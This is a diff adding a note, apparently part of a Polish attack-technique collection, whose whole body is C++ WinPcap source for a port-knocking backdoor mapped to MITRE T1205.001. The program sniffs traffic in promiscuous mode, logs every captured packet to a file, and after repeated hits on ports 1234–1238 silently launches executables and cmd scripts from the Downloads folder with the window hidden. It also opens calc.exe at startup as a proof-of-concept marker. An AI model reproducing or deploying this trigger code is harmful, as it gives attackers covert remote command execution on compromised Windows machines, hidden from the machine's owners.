@@ -1,0 +1,203 @@
+---
+title: "Command and Control.T1205.001.Port Knocking"
+folder: "Całe Ataki/3. C2 and Exfiltration"
+---
+
+
+
+
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <iostream>
+#include <pcap.h>
+
+#define LINE_LEN 16
+
+const char* get_protocol_name(const u_char* pkt_data, int datalink, int dest_port) {
+    // Sprawdź typ danych warstwy 3 (IP)
+    if (pkt_data[12] == 0x08 && pkt_data[13] == 0x00) { // Jeśli to IPv4
+        // Sprawdź protokół warstwy 4
+        if (pkt_data[23] == 0x01) {
+            return "ICMP";
+        }
+        else if (pkt_data[23] == 0x06) { // Jeśli to TCP
+            if (datalink == DLT_EN10MB) { // Dla Ethernet
+                char* result = (char*)malloc(64 * sizeof(char));
+                snprintf(result, 64, "TCP (Port %d)", dest_port);
+                return result;
+            }
+            else { // Dla innych warstw łącza danych (np. radiowe)
+                char* result = (char*)malloc(64 * sizeof(char));
+                snprintf(result, 64, "TCP (Port %d)", dest_port);
+                return result;
+            }
+        }
+        else if (pkt_data[23] == 0x11) {
+            return "UDP";
+        }
+    }
+    return "Unknown";
+}
+
+int main(int argc, char** argv)
+{
+    WinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);
+    pcap_if_t* alldevs, * d;
+    pcap_t* fp = NULL;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    int res;
+    struct pcap_pkthdr* header;
+    const u_char* pkt_data;
+
+    printf("pktdump_ex: prints the packets of the network using WinPcap.\n");
+
+    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
+    {
+        fprintf(stderr, "Error in pcap_findalldevs_ex: %s\n", errbuf);
+        return -1;
+    }
+
+    for (d = alldevs; d; d = d->next)
+    {   
+        std::cout << d->description << std::endl;
+        if (strstr(d->description, "Intel") != NULL)
+        {
+            fp = pcap_open(d->name,
+                100,
+                PCAP_OPENFLAG_PROMISCUOUS,
+                20,
+                NULL,
+                errbuf);
+
+            if (fp == NULL)
+            {
+                fprintf(stderr, "\nError opening adapter\n");
+                pcap_freealldevs(alldevs);
+                return -1;
+            }
+
+            printf("Using interface: %s (%s)\n", d->name, d->description);
+            break;
+        }
+    }
+
+    if (!d)
+    {
+        fprintf(stderr, "No Intel interfaces found! Exiting.\n");
+        pcap_freealldevs(alldevs);
+        return -1;
+    }
+    int zm1234 = 4;
+    int zm1235 = 4;
+    int zm1236 = 4;
+    int zm1237 = 4;
+    int zm1238 = 4;
+    while ((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0)
+    {
+
+        if (res == 0)
+            continue;
+
+        int dest_port = 0;
+        if (pkt_data[23] == 0x06) {
+            if (pcap_datalink(fp) == DLT_EN10MB) {
+                dest_port = (pkt_data[36] << 8) + pkt_data[37];
+            }
+            else {
+                dest_port = (pkt_data[36] << 8) + pkt_data[37];
+            }
+        }
+
+        printf("%ld:%ld (%ld) - %s\n", header->ts.tv_sec, header->ts.tv_usec, header->len, get_protocol_name(pkt_data, pcap_datalink(fp), dest_port));
+
+        for (int i = 1; (i < header->caplen + 1); i++)
+        {
+            printf("%.2x ", pkt_data[i - 1]);
+            if ((i % LINE_LEN) == 0) printf("\n");
+        }
+        printf("\n\n");
+
+        FILE* file;
+        errno_t err;
+
+        if ((err = fopen_s(&file, "wyniki.txt", "a")) != 0) {
+            perror("Nie można otworzyć pliku");
+            return 1;
+        }
+
+        fprintf(file, "%ld:%ld (%d) - %s\n", header->ts.tv_sec, header->ts.tv_sec, header->len, get_protocol_name(pkt_data, pcap_datalink(fp), dest_port));
+
+        for (int i = 1; i < header->caplen + 1; i++) {
+            fprintf(file, "%.2x ", pkt_data[i - 1]);
+            if ((i % LINE_LEN) == 0) fprintf(file, "\n");
+        }
+
+        switch (dest_port) {
+        case 1234:
+            if (zm1234 == 0) {
+                ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", L"/c C:\\Users\\User\\Downloads\\data2.tdt", NULL, 0);
+                zm1234 = 4;
+            }
+            else {
+                zm1234 = zm1234 - 1;
+            }
+            break;
+        case 1235:
+            if (zm1235 == 0) {
+                ShellExecute(NULL, L"open", L"C:\\Users\\User\\Downloads\\update.exe", L"", NULL, 0);
+                zm1235 = 4;
+            }
+            else {
+                zm1235 = zm1235 - 1;
+            }
+            break;
+        case 1236:
+            if (zm1236 == 0) {
+                ShellExecute(NULL, L"open", L"C:\\Users\\User\\Downloads\\updatev2.exe", L"", NULL, 0);
+                zm1236 = 4;
+            }
+            else {
+                zm1236 = zm1236 - 1;
+            }
+            break;
+        case 1237:
+            if (zm1237 == 0) {
+                ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\cmd.exe", L"/c C:\\Users\\User\\Downloads\\data3.tdt", NULL, 0);
+                zm1237 = 4;
+            }
+            else {
+                zm1237 = zm1237 - 1;
+            }
+            break;
+        case 1238:
+            if (zm1238 == 0) {
+                ShellExecute(NULL, L"open", L"C:\\Users\\User\\Downloads\\uninstall.exe", L"", NULL, 0);
+                zm1238 = 4;
+            }
+            else {
+                zm1238 = zm1238 - 1;
+            }
+            break;
+
+        default:
+            break;
+        }
+
+
+        fprintf(file, "\n\n");
+
+        fclose(file);
+    }
+
+    if (res == -1)
+    {
+        fprintf(stderr, "Error reading the packets: %s\n", pcap_geterr(fp));
+        return -1;
+    }
+
+    pcap_freealldevs(alldevs);
+
+    return 0;
+}
